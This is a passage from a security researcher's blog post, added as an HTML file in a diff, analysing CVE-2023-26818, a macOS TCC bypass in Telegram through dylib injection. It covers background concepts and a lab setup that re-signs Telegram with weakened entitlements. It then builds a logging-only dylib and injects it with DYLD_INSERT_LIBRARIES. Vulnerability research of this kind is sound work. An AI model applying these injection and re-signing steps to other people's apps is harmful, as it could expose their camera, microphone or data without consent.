@@ -1,0 +1,1337 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>CVE-2023-26818 Part1: MacOS TCC Bypass with telegram using DyLib Injection - Zeyad Azima</title>
+<meta name="description" content="In this analysis we discussing a vulnerability exist in telegram app on MacOS known as CVE-2023-26818. ">
+
+
+  <meta name="author" content="Zeyad Azima">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Zeyad Azima">
+<meta property="og:title" content="CVE-2023-26818 Part1: MacOS TCC Bypass with telegram using DyLib Injection">
+<meta property="og:url" content="http://localhost:5000/macos/CVE_2023_26818_P1/">
+
+
+  <meta property="og:description" content="In this analysis we discussing a vulnerability exist in telegram app on MacOS known as CVE-2023-26818. ">
+
+
+
+  <meta property="og:image" content="http://localhost:5000/assets/images/clkwqgj552ieo1jn98ipq6usu.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-08-01T00:00:00+08:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:5000/macos/CVE_2023_26818_P1/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Zeyad Azima",
+      "url": "http://localhost:5000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Zeyad Azima Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/site_data/logo.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          Zeyad Azima
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/#Security-Research">Security Research</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#MacOS">MacOS</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#IoT-Exploitation">IoT Exploitation</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#Defense-Evasion">Defense Evasion</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#General">General</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#Certificates">Certificates</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories">All Categories</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/site_data/avatar.jpg" alt="Zeyad Azima" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Zeyad Azima</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Brain Storming Stuff (Exploit Development, Reverse Engineering &amp; More)</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="mailto:contact@zeyadazima.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/AzimaZeyad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/zer0verflow/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/Zeyad-Azima" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://www.buymeacoffee.com/zeyadazima" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i><span class="label">Buy Me a Coffee</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="CVE-2023-26818 Part1: MacOS TCC Bypass with telegram using DyLib Injection">
+    <meta itemprop="description" content="Introduction">
+    <meta itemprop="datePublished" content="2023-08-01T00:00:00+08:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">CVE-2023-26818 Part1: MacOS TCC Bypass with telegram using DyLib Injection
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  20 minute read
+
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#essentials">Essentials</a>
+    <ul>
+      <li><a href="#code-signing">Code Signing</a></li>
+      <li><a href="#entitlements">Entitlements</a></li>
+      <li><a href="#hardened-runtime">Hardened Runtime</a></li>
+      <li><a href="#launch-agent">Launch Agent</a></li>
+      <li><a href="#tcc">TCC</a></li>
+      <li><a href="#dylibinjection">DyLib/Injection</a></li>
+    </ul>
+  </li>
+  <li><a href="#testing-lab">Testing Lab</a></li>
+  <li><a href="#the-analysis">The Analysis</a></li>
+  <li><a href="#exploitation">Exploitation</a></li>
+  <li><a href="#patch-diffing">Patch Diffing</a></li>
+  <li><a href="#conclusion">Conclusion</a>
+    <ul>
+      <li><a href="#resources">Resources</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="introduction"><strong>Introduction</strong></h1>
+
+<p>A vulnerability Discovered in <code class="language-plaintext highlighter-rouge">Telegram</code> for <code class="language-plaintext highlighter-rouge">MacOS</code> assigned as <code class="language-plaintext highlighter-rouge">CVE-2023-26818</code> leads to a <code class="language-plaintext highlighter-rouge">TCC</code> (Transparency, Consent, and</p>
+
+<p>Control) bypass through a <code class="language-plaintext highlighter-rouge">DyLib</code> Injection using <code class="language-plaintext highlighter-rouge">DYLD_INSERT_LIBRARIES</code> environment variable along with bypass</p>
+
+<p>the <code class="language-plaintext highlighter-rouge">SandBox</code> using <code class="language-plaintext highlighter-rouge">LaunchAgent</code>. A successful exploitation of this vulnerability will lead to a local privilege escalation by</p>
+
+<p>getting access to the camera through previously granted permissions to <code class="language-plaintext highlighter-rouge">Telegram</code>.</p>
+
+<h1 id="essentials">Essentials</h1>
+<h2 id="code-signing"><strong>Code Signing</strong></h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">Code Signing</code> is a security technology used to sign/certify your app unique so the system can verify if any changes made to</p>
+
+<p>the app is by the original owner or by malicious activity. Also, It helps prevent the loading of crafted or malicious</p>
+
+<p>components to your app as these components are not signed by the owner.</p>
+
+<h2 id="entitlements"><strong>Entitlements</strong></h2>
+
+<p><code class="language-plaintext highlighter-rouge">Entitlements</code> refers to security permissions that you give to your app either on <code class="language-plaintext highlighter-rouge">IOS</code> or <code class="language-plaintext highlighter-rouge">MacOS</code> and It’s in a <code class="language-plaintext highlighter-rouge">Key-Value</code> form.</p>
+
+<p>For example: <code class="language-plaintext highlighter-rouge">com.apple.developer.authentication-services.autofill-credential-provider</code> which is an <code class="language-plaintext highlighter-rouge">Entitlement</code> that used to provide</p>
+
+<p>user names and passwords for <code class="language-plaintext highlighter-rouge">AutoFill</code> in <code class="language-plaintext highlighter-rouge">Safari</code> and other apps &amp; It has a <code class="language-plaintext highlighter-rouge">boolen</code> type to define whether the app may do</p>
+
+<p>the <code class="language-plaintext highlighter-rouge">AutoFill</code> or no. Another example <code class="language-plaintext highlighter-rouge">com.apple.developer.location.push</code> which allows enabling a location-sharing app to query</p>
+
+<p>someone’s location in response to a push notification. And the same applies to others like accessing physical devices such</p>
+
+<p>as <code class="language-plaintext highlighter-rouge">Camera</code>.</p>
+
+<h2 id="hardened-runtime"><strong>Hardened Runtime</strong></h2>
+
+<p><code class="language-plaintext highlighter-rouge">Hardened Runtime</code> is a <code class="language-plaintext highlighter-rouge">MacOS</code> app security protection and resources access used to protect and prevent certain exploits</p>
+
+<p>against your app which is as the following: (<code class="language-plaintext highlighter-rouge">code injection</code>, <code class="language-plaintext highlighter-rouge">dynamically linked library (DLL) hijacking</code>, and <code class="language-plaintext highlighter-rouge">process memory space tampering</code>).</p>
+
+<h2 id="launch-agent"><strong>Launch Agent</strong></h2>
+
+<p>A <code class="language-plaintext highlighter-rouge">Launch Agent</code> is a mechanism used to manage and schedule the execution of background tasks or processes on <code class="language-plaintext highlighter-rouge">MacOS</code> &amp; It’s a</p>
+
+<p>part of <code class="language-plaintext highlighter-rouge">Launchd</code> which is responsible for starting, stopping, and managing processes at various stages of the system’s startup</p>
+
+<p>and operation. The daemons and agents managed by <code class="language-plaintext highlighter-rouge">launchd</code> by looking at the configuration files in the following folders:</p>
+
+<p>Folders<code class="language-plaintext highlighter-rouge">/System/Library/LaunchDaemons</code> for Apple-supplied system daemons<code class="language-plaintext highlighter-rouge">/System/Library/LaunchAgents</code> for Apple-supplied agents</p>
+
+<p>that apply to all users on a per-user basis<code class="language-plaintext highlighter-rouge">/Library/LaunchDaemons</code> for Third-party system daemons<code class="language-plaintext highlighter-rouge">/Library/LaunchAgents</code> for Third-</p>
+
+<p>party agents that apply to all users on a per-user basis<code class="language-plaintext highlighter-rouge">~/Library/LaunchAgents</code> for Third-party agents that apply only to the</p>
+
+<p>logged-in user</p>
+
+<h2 id="tcc"><strong>TCC</strong></h2>
+
+<p>TCC (<code class="language-plaintext highlighter-rouge">Transparency, Consent, and Control</code>) is a security feature in macOS that regulates access to sensitive user data/parts by</p>
+
+<p>applications with managing application access to various protected resources, such as the camera, microphone, contacts,</p>
+
+<p>calendar, location, and more. When an application attempts to access one of these resources, TCC checks if the application has</p>
+
+<p>been granted permission by the user. If permission has not been granted, the application is denied access to the resource.</p>
+
+<h2 id="dylibinjection"><strong>DyLib/Injection</strong></h2>
+
+<p><code class="language-plaintext highlighter-rouge">DyLib</code> is a short for (<code class="language-plaintext highlighter-rouge">Dynamic Library</code>) which is a library that is loaded at the runtime &amp; launch time of the software, Unless</p>
+
+<p>Static Libraries, Which are linked to the software as a part of the code during the compilation, and As a result the software size</p>
+
+<p>becomes large &amp; slower in launching time &amp; performance. Because, When the software gets launched with the included static</p>
+
+<p>libraries as a part of the code all get loaded in the same memory space as a one piece. Therefore, It suffers from slow</p>
+
+<p>launch times and large memory footprints. For the <code class="language-plaintext highlighter-rouge">DyLib</code>, It improves the performance and flexibility by not becoming a part</p>
+
+<p>of the code &amp; It gets loaded when it’s required or during the <code class="language-plaintext highlighter-rouge">runtime</code> launching time. As a result, a small size and small</p>
+
+<p>memory footprints for the software. The following diagrams show the difference between Static Libraries and <code class="language-plaintext highlighter-rouge">DyLib</code>:</p>
+
+<ul>
+  <li>
+    <p>Static Libraries:</p>
+
+    <p><img src="/assets/images/993003e029fd224299423f268be73940" alt="" /></p>
+  </li>
+  <li>
+    <p>Dynamic Libraries:</p>
+
+    <p><img src="/assets/images/d8b675ef9a787d0b6a52d3ec0f802f8a" alt="" /></p>
+  </li>
+</ul>
+
+<h1 id="testing-lab"><strong>Testing Lab</strong></h1>
+
+<p>For Our Lab<strong>,</strong> we need <code class="language-plaintext highlighter-rouge">MacOS</code> any supported version by the <code class="language-plaintext highlighter-rouge">Telegram</code> and for the vulnerable versions according to</p>
+
+<p>the <code class="language-plaintext highlighter-rouge">CVE</code> description is <code class="language-plaintext highlighter-rouge">9.3.1</code> and <code class="language-plaintext highlighter-rouge">9.4.0</code>. But, <code class="language-plaintext highlighter-rouge">Telegram</code> team deleted those versions. So we gonna download this</p>
+
+<p>one <code class="language-plaintext highlighter-rouge">9.3.2</code> from <a href="https://osx.telegram.org/updates/Telegram-9.3.241534.app.zip">here</a> and we will do some modifications to make it vulnerable again. After Downloading it, Move it to</p>
+
+<p>the <code class="language-plaintext highlighter-rouge">Applications</code> Directory. Now, We will remove the signing from telegram and re-sign it with our signature and <code class="language-plaintext highlighter-rouge">Entitlements</code>.</p>
+
+<p>Let’s first take a look on the signing information and the <code class="language-plaintext highlighter-rouge">Entitlements</code> related to <code class="language-plaintext highlighter-rouge">Telegram</code> app:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>codesign -dv --entitlements :- /Applications/Telegram.app
+</code></pre></div></div>
+
+<p><img src="/assets/images/44c5e35545533e68443c8007a2b152d0" alt="" /></p>
+
+<p>To remove telegram signing we need to execute the following command to <code class="language-plaintext highlighter-rouge">Telegram</code> App:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>codesign --remove-signature --no-strict /Applications/Telegram.app
+</code></pre></div></div>
+
+<p>Now, The command is run successfully, and if we check the signing with <code class="language-plaintext highlighter-rouge">codesign</code> command. We can see it has no signing:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>codesign -dv --etitlements :- /Applications/Telegram.app
+</code></pre></div></div>
+
+<p><img src="/assets/images/a6e6a5e6b7939329fc79a449f819dc8f" alt="" /></p>
+
+<p>Let’s sign <code class="language-plaintext highlighter-rouge">Telegram</code> App now with our own signature and <code class="language-plaintext highlighter-rouge">Entitlements</code>, First, we need to get our own signature, You can get it</p>
+
+<p>by doing the following… First, Download <code class="language-plaintext highlighter-rouge">Xcode</code> from AppStore on your <code class="language-plaintext highlighter-rouge">MacOS</code>:</p>
+
+<p><img src="/assets/images/ec28edede23a9dd0692d63d17b2f7fec" alt="" /></p>
+
+<p>After that open <code class="language-plaintext highlighter-rouge">Xcode</code> and create a new project then go to <code class="language-plaintext highlighter-rouge">Xcode</code> in the menu and then <code class="language-plaintext highlighter-rouge">Settings</code>:</p>
+
+<p><img src="/assets/images/7b53610bb20fec90d746738f50e9b07c" alt="" /></p>
+
+<p>Then go to <code class="language-plaintext highlighter-rouge">accounts</code> and click on <code class="language-plaintext highlighter-rouge">+</code> and add your Apple ID:</p>
+
+<p><img src="/assets/images/5f78799aca67f0b87c06b4cf19355900" alt="" /></p>
+
+<p>After adding your Apple ID, Click on <code class="language-plaintext highlighter-rouge">Manage Certificates</code> and click on <code class="language-plaintext highlighter-rouge">+</code> and add a new signing certificate:</p>
+
+<p><img src="/assets/images/72cc9ef1ea7073bad8fdad881f5c0406" alt="" /></p>
+
+<p>After finishing we need to build the test app to get our signature So, we need to configure the signing. Click on our project</p>
+
+<p>on the left side, The go to <code class="language-plaintext highlighter-rouge">Signing &amp; Capabilities</code> tab and choose your ID:</p>
+
+<p><img src="/assets/images/26c543827c39fa92847924c63848d80e" alt="" /></p>
+
+<p>Finally, Click on the play button to build and run the app:</p>
+
+<p><img src="/assets/images/771df34f3f275bc8fa3f31d4fdae6a9c" alt="" /></p>
+
+<p>Now, It’s time top get our signature by executing the following command:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>security find-identity -v -p codesigning
+</code></pre></div></div>
+
+<p><img src="/assets/images/cd385b43d9d6279e0813fad1d7da3783" alt="" /></p>
+
+<p>I had created 2 before so you can see them clearly, Now it’s time to create our <code class="language-plaintext highlighter-rouge">Entitlements</code> that we gonna sign with telegram:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
+&lt;plist version="1.0"&gt;
+&lt;dict&gt;
+    &lt;key&gt;com.apple.security.app-sandbox&lt;/key&gt;
+    &lt;false/&gt;
+    &lt;key&gt;com.apple.security.application-groups&lt;/key&gt;
+    &lt;array&gt;
+        &lt;string&gt;6N38VWS5BX.ru.keepcoder.Telegram&lt;/string&gt;
+        &lt;string&gt;6N38VWS5BX.ru.keepcoder.Telegram.TelegramShare&lt;/string&gt;
+    &lt;/array&gt;
+    &lt;key&gt;com.apple.security.cs.allow-dyld-environment-variables&lt;/key&gt;
+    &lt;true/&gt;
+    &lt;key&gt;com.apple.security.cs.disable-library-validation&lt;/key&gt;
+    &lt;true/&gt;
+    &lt;key&gt;com.apple.security.device.audio-input&lt;/key&gt;
+    &lt;true/&gt;
+    &lt;key&gt;com.apple.security.device.camera&lt;/key&gt;
+    &lt;true/&gt;
+    &lt;key&gt;com.apple.security.personal-information.location&lt;/key&gt;
+    &lt;true/&gt;
+&lt;/dict&gt;
+&lt;/plist&gt;
+</code></pre></div></div>
+
+<p>Now save all these <code class="language-plaintext highlighter-rouge">Entitlements</code> into a file let’s name it <code class="language-plaintext highlighter-rouge">entit.plist</code>. It’s time to take your valid development signature and</p>
+
+<p>let’s start signing <code class="language-plaintext highlighter-rouge">Telegram</code> App:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>codesign --force --deep --sign "Developer ID" --entitlements entit.plist /Applications/Telegram.app
+</code></pre></div></div>
+
+<p><img src="/assets/images/461faabe008a5dc6c1e13e6e98c2772f" alt="" /></p>
+
+<p>Now, We have the app signed by us and it’s ready for analysis.</p>
+
+<h1 id="the-analysis"><strong>The Analysis</strong></h1>
+
+<p>Let’s start our analysis by taking a look at the signing information we did which simulate<strong>s</strong> the actual one for the version</p>
+
+<p>that got deleted by the team.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>codesign -dv --entitlements :- /Applications/Telegram.app
+</code></pre></div></div>
+
+<p><img src="/assets/images/646e560cb599503f78184afdcb2ee4f9" alt="" /></p>
+
+<p>This command is to show the signing info of the app, Along with <code class="language-plaintext highlighter-rouge">Entitlements</code>. The <code class="language-plaintext highlighter-rouge">-dv</code> is to display information about code</p>
+
+<p>signing and verbosing. for <code class="language-plaintext highlighter-rouge">--entitlements :-</code> is to display the app <code class="language-plaintext highlighter-rouge">Entitlements</code>. When we take a closer look we can see the</p>
+
+<p>highlighted places which are <code class="language-plaintext highlighter-rouge">flags=0x0(none)</code> the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;key&gt;com.apple.security.cs.disable-library-validation&lt;/key&gt;&lt;true/&gt;
+</code></pre></div></div>
+
+<p>So, What is this key, and what it’s doing? the <code class="language-plaintext highlighter-rouge">com.apple.security.cs.disable-library-validation</code> is one of the <code class="language-plaintext highlighter-rouge">Entitlements</code> that</p>
+
+<p>controls whether library validation is enabled or disabled for the application, Which is a security feature in <code class="language-plaintext highlighter-rouge">MacOS</code> that</p>
+
+<p>checks and validates the code signature of <code class="language-plaintext highlighter-rouge">DyLib</code> loaded by an application. As a result, It avoids loading a non-</p>
+
+<p>signed/verified <code class="language-plaintext highlighter-rouge">DyLib</code> which could be maliciouis. Here we can see that the <code class="language-plaintext highlighter-rouge">DyLib</code> validation is turned off. Then, We can load</p>
+
+<p>a malicious <code class="language-plaintext highlighter-rouge">DyLib</code> Into the app. Now, How that could happen? Well, there are many ways that the apps normally used in</p>
+
+<p>loading <code class="language-plaintext highlighter-rouge">DyLib</code> as the following:</p>
+
+<ul>
+  <li>
+    <p><strong>Dyld Environment Variable:</strong> An application can specify a list of directories in the <code class="language-plaintext highlighter-rouge">DYLD_INSERT_LIBRARIES</code> environment</p>
+  </li>
+  <li>
+    <p>variable where the dynamic linker (<code class="language-plaintext highlighter-rouge">dyld</code>) should search for <code class="language-plaintext highlighter-rouge">DyLibs</code>. If this variable is set, <code class="language-plaintext highlighter-rouge">dyld</code> will look in these</p>
+  </li>
+  <li>
+    <p>directories when resolving library dependencies.</p>
+  </li>
+  <li>
+    <p><strong>RPATH:</strong> An application can specify a runtime search path (<code class="language-plaintext highlighter-rouge">RPATH</code>) inside the binary, which tells <code class="language-plaintext highlighter-rouge">dyld</code> where to search</p>
+  </li>
+  <li>
+    <p>for <code class="language-plaintext highlighter-rouge">DyLibs</code>. This path is encoded in the executable file and is used during runtime to locate required libraries.</p>
+  </li>
+  <li>
+    <p><strong>Frameworks:</strong> <code class="language-plaintext highlighter-rouge">MacOS</code> applications can use frameworks, which are bundles of shared libraries, headers, and other resources. Frameworks are a convenient way to package and load libraries, and they are commonly used by <code class="language-plaintext highlighter-rouge">MacOS</code> app developers.</p>
+  </li>
+  <li>
+    <p><strong>Bundles and Plug-ins:</strong> An application can load <code class="language-plaintext highlighter-rouge">DyLibs</code> from separate bundles or plug-ins that are loaded at runtime. Bundles and plug-ins are essentially separate packages containing code and resources that the application can load as needed.</p>
+  </li>
+  <li>
+    <p><strong>Mach-O Dynamic Linker API:</strong> An application can use the <code class="language-plaintext highlighter-rouge">Mach-O</code> dynamic linker API to explicitly load and link dylibs at</p>
+  </li>
+  <li>
+    <p>runtime. This allows the application to control the loading and unloading of libraries programmatically.</p>
+  </li>
+  <li>
+    <p><strong>NSAddImage():</strong> On <code class="language-plaintext highlighter-rouge">MacOS</code>, <code class="language-plaintext highlighter-rouge">Objective-C</code> applications can use the <code class="language-plaintext highlighter-rouge">NSAddImage()</code> function to dynamically load a <code class="language-plaintext highlighter-rouge">DyLibs</code> at</p>
+  </li>
+  <li>
+    <p>runtime. This function allows the application to load a library and use the symbols defined in it.</p>
+  </li>
+  <li>
+    <p><strong>dlopen() and dlsym():</strong> Applications can use the standard <code class="language-plaintext highlighter-rouge">C</code> library functions <code class="language-plaintext highlighter-rouge">dlopen()</code> and <code class="language-plaintext highlighter-rouge">dlsym()</code> to load and access symbols from <code class="language-plaintext highlighter-rouge">DyLibs</code> at runtime. These functions are commonly used in dynamic loading scenarios.</p>
+  </li>
+</ul>
+
+<p>Is it only vulnerable when it has this <code class="language-plaintext highlighter-rouge">Entitlement</code> ? No, and There are other cases as the following:</p>
+
+<ul>
+  <li>
+    <p>When the app is not defined as <code class="language-plaintext highlighter-rouge">Hardened Runtime</code>.</p>
+  </li>
+  <li>
+    <p>When the app has <code class="language-plaintext highlighter-rouge">com.apple.security.cs.disable-library-validation</code> in the <code class="language-plaintext highlighter-rouge">Entitlements</code>.</p>
+  </li>
+  <li>
+    <p>When the app has <code class="language-plaintext highlighter-rouge">com.apple.security.cs.allow-dyld-environment-variables</code> in the <code class="language-plaintext highlighter-rouge">Entitlements</code>.</p>
+  </li>
+</ul>
+
+<p>Our main focus now is to exploit <code class="language-plaintext highlighter-rouge">DyLib</code> Injection through <strong>Dyld Environment Variable</strong>, We can do this easily by setting</p>
+
+<p>the <code class="language-plaintext highlighter-rouge">DYLD_INSERT_LIBRARIES</code> environment variable. To inject our <code class="language-plaintext highlighter-rouge">DyLib</code> we need to write our own malicious one to use and this</p>
+
+<p>can be done using <code class="language-plaintext highlighter-rouge">Objective-C</code>, Which is primarily used in development for <code class="language-plaintext highlighter-rouge">OSX</code> and <code class="language-plaintext highlighter-rouge">IOS</code>. In other words, Apple products.</p>
+
+<p>back in the time, It was developed by <code class="language-plaintext highlighter-rouge">NeXT</code> for the <code class="language-plaintext highlighter-rouge">NeXTSTEP OS</code> before Apple takes it. the language is a superset</p>
+
+<p>of <code class="language-plaintext highlighter-rouge">C</code> language. We won’t cover the basics of <code class="language-plaintext highlighter-rouge">Objective-C</code>, But, We will be explaining the code parts:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#import &lt;Foundation/Foundation.h&gt;
+
+__attribute__((constructor))
+static void telegram(int argc, const char **argv) {
+NSLog(@"[+] Dynamic library loaded into %s", argv[0]);
+}
+</code></pre></div></div>
+
+<p>First, We Imported the <code class="language-plaintext highlighter-rouge">Foundation</code> framework which provides fundamental classes and functionality similar to <code class="language-plaintext highlighter-rouge">stdio.h</code> library</p>
+
+<p>in <code class="language-plaintext highlighter-rouge">C</code> language. Then, <code class="language-plaintext highlighter-rouge">__attribute__((constructor))</code> which is a compiler attribute, When applied to a function, It indicates that</p>
+
+<p>the function should be executed automatically when the <code class="language-plaintext highlighter-rouge">DyLib</code> is loaded. After that, we declared a static function</p>
+
+<p>named <code class="language-plaintext highlighter-rouge">telegram</code> Inside it, we can see <code class="language-plaintext highlighter-rouge">NSLog(@"[+] Dynamic library loaded into %s", argv[0]);</code> which prints a massage followed by</p>
+
+<p>the value of the first element of the <code class="language-plaintext highlighter-rouge">argv</code> array which represents the path to the executable of the app that loaded</p>
+
+<p>the <code class="language-plaintext highlighter-rouge">DyLib</code>. Now, Let’s save our code in a file named <code class="language-plaintext highlighter-rouge">teleDyLib.m</code>:</p>
+
+<p><img src="/assets/images/8f02fbee8d1acc3f26c9782b0f7296b5" alt="" /></p>
+
+<p>After that, we will be compiling our code using <code class="language-plaintext highlighter-rouge">gcc</code> normally using the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -framework Foundation -dynamiclib teleDyLib.m -o tele.dylib
+</code></pre></div></div>
+
+<p>Here we specified the framework we wanna use <code class="language-plaintext highlighter-rouge">-framework</code> argument, Along with <code class="language-plaintext highlighter-rouge">-dynamiclib</code> argument to compile our code as</p>
+
+<p>a <code class="language-plaintext highlighter-rouge">DyLib</code>.</p>
+
+<p><img src="/assets/images/63d0274573031cbe9ae6d7e0effce913" alt="" /></p>
+
+<p>Here we see our <code class="language-plaintext highlighter-rouge">DyLib</code> ready. Now, Let’s perform our <code class="language-plaintext highlighter-rouge">DyLib</code> Injection to test it:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DYLD_INSERT_LIBRARIES=tele.dylib /Applications/Telegram.app/Contents/MacOS/Telegram
+</code></pre></div></div>
+
+<p><img src="/assets/images/cab9b5ee9776c924e47af9beab531df8" alt="" /></p>
+
+<p>Here we can see in the screenshot the highlighted spot, Where the output shows that the library Injected and loaded</p>
+
+<p>successfully. Let’s Take a look at it dynamically while <code class="language-plaintext highlighter-rouge">Telegram</code> loading our library using <code class="language-plaintext highlighter-rouge">opensnoop</code> tool.</p>
+
+<p>Basically, <code class="language-plaintext highlighter-rouge">opensnoop</code> tracks file opens. As a process issues a file open, details such as <code class="language-plaintext highlighter-rouge">UID</code>, <code class="language-plaintext highlighter-rouge">PID</code> and <code class="language-plaintext highlighter-rouge">pathname</code> are printed</p>
+
+<p>out.:</p>
